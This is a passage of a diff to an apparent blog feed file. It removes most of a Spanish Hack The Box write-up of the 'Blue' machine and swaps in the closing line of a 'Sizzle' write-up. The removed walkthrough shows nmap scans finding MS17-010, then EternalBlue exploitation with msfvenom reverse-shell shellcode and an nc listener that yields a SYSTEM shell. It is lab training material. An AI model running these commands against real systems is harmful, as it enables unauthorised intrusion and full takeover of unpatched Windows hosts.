-           Raw packets sent: 150431 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.619MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 75540 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.022MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.40
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 135,139,445,49152,49153,49154,49155,49156,49157
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p135&lt;/span&gt;,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:42 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
-49157/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: HARIS-PC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-17T02:48:03
-|_  start_date: 2021-09-17T02:42:45
-| smb2-security-mode: 
-|   2.1: 
-|_    Message signing enabled but not required
-| smb-os-discovery: 
-|   OS: Windows 7 Professional 7601 Service Pack 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows 7 Professional 6.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
-|   Computer name: haris-PC
-|   NetBIOS computer name: HARIS-PC&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
-|   Workgroup: WORKGROUP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
-|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-17T03:48:01+01:00
-|_clock-skew: mean: &lt;span class=&quot;nt&quot;&gt;-15m13s&lt;/span&gt;, deviation: 34m37s, median: 4m45s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;75.70 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Observamos que se encuentra abierto el puerto 445 asociado al servicio de SMB; por lo que podríamos tirar un escaneo &lt;em&gt;“vuln and safe”&lt;/em&gt; sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar si puede ser vulnerable al &lt;strong&gt;Eternal Blue&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p445&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; smbScan
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:46 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
-
-Host script results:
-| smb-vuln-ms17-010: 
-|   VULNERABLE:
-|   Remote Code Execution vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft SMBv1 servers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms17-010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2017-0143
-|     Risk &lt;span class=&quot;nb&quot;&gt;factor&lt;/span&gt;: HIGH
-|       A critical remote code execution vulnerability exists &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft SMBv1
-|        servers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms17-010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-|           
-|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2017-03-14
-|     References:
-|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2017-0143
-|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;4.46 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con los resultados observados, vemos que es vulnerable al &lt;strong&gt;ms17-010&lt;/strong&gt; y además sabemos que la máquina tiene &lt;em&gt;Windows 7 Professional 7601 Service Pack 1&lt;/em&gt;; entonces ya sabemos que descargamos el exploit correspondiente.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/3ndG4me/AutoBlue-MS17-010&quot;&gt;AutoBlue-MS17-010&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
-Clonando en &lt;span class=&quot;s1&quot;&gt;'AutoBlue-MS17-010'&lt;/span&gt;...
-remote: Enumerating objects: 126, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;50/50&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15/15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 126 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 35&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 76
-Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;126/126&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 94.22 KiB | 1015.00 KiB/s, listo.
-Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;74/74&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez descargado, ingresamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoBlue-MS17-010/shellcode&lt;/code&gt; para generar el shellcode correspondiente mediante la ejecucion del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell_prep.sh&lt;/code&gt; e ingresamos los datos que nos va solicitando:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ./shell_prep.sh         
-                 _.-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;-._ 
-          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   |
-          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|_.-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;-._|   
-          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|   &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   |                                      
-          &lt;span class=&quot;s1&quot;&gt;'-..-'&lt;/span&gt;|_.-&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;-._|   
-Eternal Blue Windows Shellcode Compiler
-
-Let&lt;span class=&quot;s1&quot;&gt;'s compile them windoos shellcodezzz
-                                
-Compiling x64 kernel shellcode                                                                                                   
-Compiling x86 kernel shellcode
-kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
-y         
-LHOST for reverse connection:                                   
-10.10.14.2
-LPORT you want x64 to listen on: 
-443 
-LPORT you want x86 to listen on:                                                                                                 
-4443
-Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
-1
-Type 0 to generate a staged payload or 1 to generate a stageless payload
-1
-Generating x64 cmd shell (stageless)...                                                                                          
-                                                                                                                                 
-msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.2 LPORT=443
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Saved as: sc_x64_msf.bin                                        
-
-Generating x86 cmd shell (stageless)...                                                                                          
-                                                                                                                                 
-msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.2 LPORT=4443
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 324 bytes
-Saved as: sc_x86_msf.bin  
-                                
-MERGING SHELLCODE WOOOO!!!
-DONE
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoBlue-MS17-010/&lt;/code&gt; ejecutamos el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eternalblue_exploit7.py&lt;/code&gt; pasandole de argumentos la dirección IP víctima &lt;em&gt;10.10.10.40&lt;/em&gt; y el shellcode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode/sc_x64.bin&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
-shellcode size: 1232
-numGroomConn: 13
-Target OS: Windows 7 Professional 7601 Service Pack 1
-SMB1 session setup allocate nonpaged pool success
-SMB1 session setup allocate nonpaged pool success
-good response status: INVALID_PARAMETER
-&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al mismo tiempo, nos ponemos en escucha por el puerto 443 y esperamos que se establezca la conexión:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.2] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.40] 49158
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto ya ingresamos a la máquina como &lt;strong&gt;nt authority\system&lt;/strong&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Blue en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Kerberoasting" /><category term="Powershell" /><category term="AppLocker_Bypass" /><summary type="html">Resolución de la máquina Sizzle en la plataforma de Hack The Box</summary></entry></feed>
